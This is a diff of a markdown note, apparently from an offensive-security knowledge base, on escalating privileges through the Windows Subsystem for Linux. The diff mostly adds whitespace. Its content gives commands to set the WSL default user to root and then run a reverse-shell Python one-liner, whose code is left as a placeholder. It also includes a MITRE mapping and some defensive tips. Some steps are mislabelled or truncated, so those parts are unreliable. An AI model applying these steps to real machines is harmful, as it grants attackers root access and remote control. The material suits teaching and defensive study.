@@ -39,11 +39,15 @@ Technical Explanation: WSL allows users to run Linux binaries on Windows, which 
 
 Business Value: An attacker who gains root access to a system can steal sensitive data, install backdoors, and execute malicious code, causing significant damage to the organization.
 
+ 
+
 ## Requirements
 
 1. Access to a Windows 10 system with WSL installed
 
 1. Low-privileged user account
+
+ 
 
 ## Defense
 
@@ -53,20 +57,32 @@ Business Value: An attacker who gains root access to a system can steal sensitiv
 
 1. Monitor WSL activity for suspicious behavior
 
+ 
+
 ## Objectives
 
 1. Escalate privileges from a low-privileged user to the root user
 
 1. Gain full control of the system
 
+ 
+
 # Instructions
 
 1. This command sets the default user of the WSL to root, which allows for the execution of commands with elevated privileges. The final command executes a Python script to establish a reverse shell connection.
 
+ 
+
+
+
 **Code**: [[wsl whoami
 ./ubuntun1604.exe config --default-user]]
 
+
+
 > The `wsl whoami` command prints the current user of the WSL, while `./ubuntun1604.exe config --default-user root` sets the default user to root. The final command `wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'` executes a Python script that establishes a reverse shell connection. The `BIND_OR_REVERSE_SHELL_PYTHON_CODE` needs to be replaced with the actual Python code that creates the reverse shell connection. This command is useful for gaining root access to the WSL environment.
+
+
 
 **Command** ([[Check WSL User]]):
 
@@ -74,11 +90,19 @@ Business Value: An attacker who gains root access to a system can steal sensitiv
 wsl whoami
 ```
 
+
+
+
+
 **Command** ([[Set Default User to Root]]):
 
 ```bash
 ./ubuntun1604.exe config --default-user root
 ```
+
+
+
+
 
 **Command** ([[Check WSL User Again]]):
 
@@ -86,27 +110,51 @@ wsl whoami
 wsl whoami
 ```
 
+
+
+
+
 **Command** ([[Run Python Reverse Shell Code]]):
 
 ```bash
 wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
 ```
 
+
+
 2. Use this command to get information about the bash executable file.
 
+ 
+
+
+
 **Code**: [[bash.exe]]
+
+
 
 > The 'bash.exe' file is the executable file for the Bash shell. By using this command, you can get information about the file such as its location, size, version, and other details. This command can be useful when troubleshooting issues related to the Bash shell or when trying to understand more about the system environment.
 
 3. To execute Bash commands on Windows, use the Bash executable located at the given path.
 
+ 
+
+
+
 **Code**: [[C:\Windows\WinSxS\amd64_microsoft-windows-lxssbash]]
+
+
 
 > This command provides the path to the Bash executable on Windows. The Bash executable can be used to execute Bash commands on Windows. Users can use this command to locate the Bash executable and use it to run Bash commands on their Windows machine. The path provided may vary based on the version of Windows and the installation location of the Bash executable.
 
 4. Install WSL on Windows 10
 
+ 
+
+
+
 **Code**: [[WSL]]
+
+
 
 > WSL (Windows Subsystem for Linux) is a compatibility layer for running Linux binary executables natively on Windows 10. To install WSL, follow these steps:
 
@@ -119,11 +167,17 @@ wsl python -c 'BIND_OR_REVERSE_SHELL_PYTHON_CODE'
 
 After completing these steps, you will be able to use the Linux command line interface and install Linux packages on your Windows 10 machine using the 'apt-get' package manager.
 
+
+
 **Command** ([[Install WSL]]):
 
 ```bash
 sudo apt-get update && sudo apt-get install -yqq python3
 ```
+
+
+
+
 
 **Command** ([[Verify installation]]):
 
@@ -131,17 +185,29 @@ sudo apt-get update && sudo apt-get install -yqq python3
 wsl -l -v
 ```
 
+
+
 5. To access the Ubuntu filesystem folder, navigate to the following path in your Windows File Explorer: C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\
+
+ 
+
+
 
 **Code**: [[C:\Users\%USERNAME%\AppData\Local\Packages\Canonic]]
 
+
+
 > This command provides the path to the Ubuntu filesystem folder on a Windows machine. The folder contains the root file system of the Ubuntu installation, allowing users to access and modify files and directories within the Ubuntu environment from their Windows machine.
+
+
 
 **Command** ([[Accessing Ubuntu rootfs directory]]):
 
 ```bash
 cd C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWindows_79rhkp1fndgsc\LocalState\rootfs\
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -167,3 +233,5 @@ cd C:\Users\%USERNAME%\AppData\Local\Packages\CanonicalGroupLimited.UbuntuonWind
 
 - [[EoP - Windows Subsystem for Linux (WSL)]]
 - [[Windows - Privilege Escalation]]
+
+
